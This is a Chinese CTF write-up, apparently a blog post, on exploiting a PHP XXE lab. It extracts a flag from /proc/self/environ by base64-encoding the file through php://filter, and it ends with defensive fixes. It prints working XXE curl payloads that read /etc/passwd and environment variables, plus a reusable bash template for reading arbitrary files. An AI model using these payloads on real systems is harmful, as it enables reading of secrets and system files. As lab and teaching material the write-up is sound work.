title: 当 flag 不在磁盘上：PHP XXE 绕过 /proc 的 NUL 截断读环境变量 date: 2026-11-19 15:46:00 +0800 categories: [CTF, Writeup] tags: [XXE, PHP, BUUCTF, vulfocus, 环境变量, /proc]
靶场：BUUCTF-Real / [PHP]XXE（vulfocus php_xxe 同源镜像） 目标：direct-ctf2.dasctf.com:27732 结果：flag 拿下，但不是从文件里读出来的 —— 这台的 flag 压根不在磁盘上。 这篇文章记录的不是"一发入魂"，而是连续踩坑、被自己的 payload 骗了四五次的全过程。

1. 一句话结论
flag 以环境变量形式注入容器，落在 /proc/self/environ 里；而该文件包含 \0， DOMDocument / SimpleXMLElement 会在第一个 NUL 字节处报 Char 0x0 out of allowed range 并截断。 用 php://filter/convert.base64-encode 先编码再外带，才能读到完整内容。

bash


P=http://target:27732/SimpleXMLElement.php
getb() { printf '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=%s">]><root><name>&x;</name></root>' "$1" \
  | curl -s -X POST "$P" -H 'Content-Type: application/xml' --data-binary @-; }

getb /proc/self/environ | tr -d ' \r\n' | base64 -d | tr '\0' '\n'
代码块


PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=ctf-target-02f982106d7f4eada305036c279f7fc5
FLAG=flag{5c266642-db0a-4162-a4ff-c2e229fa4aa3}
KUBERNETES_PORT=tcp://10.43.0.1:443
...
2. 环境与入口
BUUCTF 的 Real 系列基本是 vulfocus 靶场镜像直搬，本题对应 vulhub 的 php/php_xxe，Web 根目录四个文件：

代码块


/var/www/html/
├── dom.php                     # DOMDocument 解析
├── SimpleXMLElement.php        # SimpleXMLElement 解析
├── simplexml_load_string.php   # simplexml_load_string 解析
└── index.php                   # phpinfo（读题时唯一的"正常页面"）
源码（vulhub 上游，实测与本镜像一致）：

php


// dom.php
<?php
$data = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($data);     // 注意：没有 LIBXML_NOENT
print_r($dom);            // 注意：打印对象，不打印内容

// SimpleXMLElement.php / simplexml_load_string.php
<?php
$data = file_get_contents('php://input');
$xml = new SimpleXMLElement($data);
echo $xml->name;          // ← 只回显根节点的 <name> 子元素
这两行注释就是后面所有坑的根源。

3. 第一坑：路径写错，打了空气
最初照着某篇 writeup 打了 /dom4j：

bash


curl -s -X POST "http://target:27732/dom4j" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/flag">]><root>&test;</root>'
回显是满屏 System V Semaphores / PHP License 的 HTML —— 那是 index.php 的 phpinfo 页面。

教训 ①：拿到 HTML 回显先看一眼 HTTP 状态码和体积，别直接解读内容。 -w '%{http_code} %{size_download}' 一行就能分清"打错门"和"打对了没回显"。

4. 第二坑：dom.php 是个哑巴
换到 /dom.php，HTTP 200，size=1394，回显是：

代码块


DOMDocument Object
(
    [doctype] => (object value omitted)
    [documentElement] => (object value omitted)
    ...
)
原因有两个，叠在一起：

print_r($dom) 打印的是对象结构，不是文档内容；
loadXML($data) 没有传 LIBXML_NOENT，实体根本不会被替换进文本节点。
教训 ②：先读源码再调 payload。看到 print_r($obj) 就该直接判定"这个入口永远不回显"，换文件，别在它身上试第三种 payload。

不过它并非全无用处 —— 它成了后面最好用的文件存在性探针：

回显	含义
只有 DOMDocument Object(...)，无 Warning	文件成功加载
I/O warning : failed to load external entity "file:///xxx"	文件不存在 / 读不了
5. 第三坑：/flag 根本不存在
用上面的探针横扫常见路径，全灭：

bash


miss  /flag          miss  /flag.txt       miss  /tmp/flag
miss  /root/flag     miss  /flag.php       miss  /var/www/html/flag
miss  /home/flag     miss  /home/ctf/flag  miss  /flag/flag
甚至连 /entrypoint.sh、/start.sh、/docker-entrypoint.sh 也都是 failed to load external entity —— 这个容器里根本没有启动脚本。

后来才想明白：镜像构建时就把 flag 注进去了，不落文件。

教训 ③：file:// 读取失败时，"文件不存在"和"权限不足"报的是同一个错误， 探针分不开这两者。想验证探针可靠性，得拿 /etc/passwd（可读）和 /etc/shadow（不可读）做对照组。

6. 第四坑：<root> 和 <name> 是两层，不是一层
SimpleXMLElement.php 是 echo $xml->name; —— 取的是根节点的子元素 name。

所以 payload 必须是：

xml


<root>
  <name>&x;</name>
</root>
而不是：

xml


<name>&x;</name>      <!-- 错：这会让 $xml->name 指向子元素，回显空 -->
<root><n>&x;</n></root> <!-- 错：子元素叫 n，不是 name -->
验证三连（很值得保留的调试习惯）：

bash


P=http://target:27732/SimpleXMLElement.php
curl -s -X POST "$P" -d '<root><name>HELLO</name></root>'                                        # 回 HELLO
curl -s -X POST "$P" -d '<!DOCTYPE root [<!ENTITY x "WORLD">]><root><name>&x;</name></root>'     # 回 WORLD
curl -s -X POST "$P" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]><root><name>&x;</name></root>'
第三条吐出完整 /etc/passwd 的瞬间，XXE 通道就正式打通了。

教训 ④：payload 不回显时，先做"纯文本 → 内部实体 → 外部实体"三级递进测试， 一次就能定位是"结构错""实体不展开"还是"文件读不到"，比盲猜快十倍。

7. 第五坑：zsh 的 ! 历史展开
把 payload 塞进双引号循环时，zsh 直接报：

代码块


zsh: event not found: DOCTYPE
zsh 默认开启 bang_hist，!DOCTYPE 被当成历史命令展开。

三种解法（随手记）：

bash


setopt no_bang_hist          # 临时关掉
# 或用单引号包 printf 格式串（推荐）
payload=$(printf '<?xml version="1.0"?><!DOCTYPE root [...]><root><name>&x;</name></root>' "$f")
# 或写成脚本文件 /tmp/x.sh 再执行
8. 真正的解法：flag 在环境变量里
/proc/self/environ 直接读，会被 NUL 截断：

代码块


Warning: SimpleXMLElement::__construct(): parser error : Char 0x0 out of allowed range
Warning: SimpleXMLElement::__construct(): PATH=/usr/local/sbin:/usr/local/bin:...
Warning: SimpleXMLElement::__construct(): Entity 'x' failed to parse
只露出了 PATH= 那一行就断了 —— 因为环境变量之间用 \0 分隔，XML 解析器遇到 0x0 直接停。

关键一步：先 base64。 php://filter 是流式过滤器，会把整个文件读完再编码，NUL 变成普通字符：

bash


P=http://target:27732/SimpleXMLElement.php
getb() { printf '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=%s">]><root><name>&x;</name></root>' "$1" \
  | curl -s -X POST "$P" -H 'Content-Type: application/xml' --data-binary @-; }

getb /proc/self/environ | tr -d ' \r\n' | base64 -d | tr '\0' '\n'
tr '\0' '\n' 把变量之间的 NUL 掰成换行，一屏看清：

代码块


PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=ctf-target-02f982106d7f4eada305036c279f7fc5
PHP_INI_DIR=/usr/local/etc/php
FLAG=flag{5c266642-db0a-4162-a4ff-c2e229fa4aa3}
KUBERNETES_PORT=tcp://10.43.0.1:443
CFT_TARGET_02f982106d7f4eada305036c279f7fc5_SVC_SERVICE_HOST=10.43.177.115
HOME=/root
Flag：flag{5c266642-db0a-4162-a4ff-c2e229fa4aa3}

顺便还能看出这是跑在 Kubernetes 里的靶场实例（一堆 KUBERNETES_* / CFT_TARGET_* 注入变量）。

9. 完整攻击链（可复用的模板）
bash


#!/bin/bash
# XXE 读文件通用模板：base64 外带 + 自动解码
T=http://target:27732
P=$T/SimpleXMLElement.php

getb() {   # $1 = 远端绝对路径
  printf '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=%s">]><root><name>&x;</name></root>' "$1" \
  | curl -s -X POST "$P" -H 'Content-Type: application/xml' --data-binary @- \
  | tr -d ' \r\n' | base64 -d 2>/dev/null
}

# 1. 通道验证
getb /etc/passwd | head -3

# 2. 常规 flag 路径（本题全 miss，但别的题有用）
for f in /flag /flag.txt /tmp/flag /root/flag /var/www/html/flag; do
  echo "--- $f"; getb "$f"; echo
done

# 3. 环境变量（本题的答案）
getb /proc/self/environ | tr '\0' '\n'

# 4. 进程信息 / 源码
getb /proc/self/cmdline | tr '\0' ' '; echo
getb /var/www/html/index.php
10. 防御视角
这类题在真实业务里对应的修复其实很朴素：

禁用外部实体（PHP ≥ 8.0 已默认禁用 DTD 加载）：
php


libxml_disable_entity_loader(true);          // PHP < 8.0
$dom->loadXML($xml, LIBXML_NONET);           // 禁止网络访问
升级 libxml 到 2.9.0+，默认不再解析外部实体；
不要把敏感信息塞进环境变量：容器里 /proc/self/environ 对同 uid 进程完全可读， 凭证应走 secret 挂载 + 最小权限，而不是 ENV FLAG=...；
输入侧做 XML 白名单校验，拒绝 <!DOCTYPE / <!ENTITY。
11. 时间线（真实的踩坑节奏）
时间	动作	结果
15:28	POST /dom4j	回到 phpinfo 页面（路径错）
15:31	改打 /dom.php	200，1394 字节，只有对象 dump
15:33	读 /etc/passwd	✅ 加载成功但无回显；/flag 报 entity 不存在
15:35–15:37	扫 14 个 flag 路径	全 miss
15:39	误用 <name> 作根元素	空回显
15:41	修正为 <root><name>	✅ /etc/passwd 全文吐出，通道打通
15:43	zsh ! 历史展开	event not found: DOCTYPE
15:45	读 /proc/self/environ	NUL 截断，只看到 PATH=
15:46	base64 编码后读 environ	🎉 FLAG=flag{...}
从 15:28 到 15:46，18 分钟，五连坑。

12. 复盘：哪三条最值钱
先读源码，再调 payload。echo $xml->name 和 print_r($dom) 这两行，能省掉一半的无效尝试。
空回显要分级排查：纯文本 → 内部实体 → 外部实体 → 目标文件，逐级递进，一次定位断点。
"读不到" ≠ "不存在"，更 ≠ "漏洞没打通"。/proc/* 的 NUL 截断、权限报错与文件缺失同一文案，都会骗人； base64 是所有含二进制/NUL 文件的通用开关，随手先套上，能少走很多弯路。
Flag 不在磁盘上这件事，本身就挺 CTF 的：你以为在找文件，其实在找运行时环境。
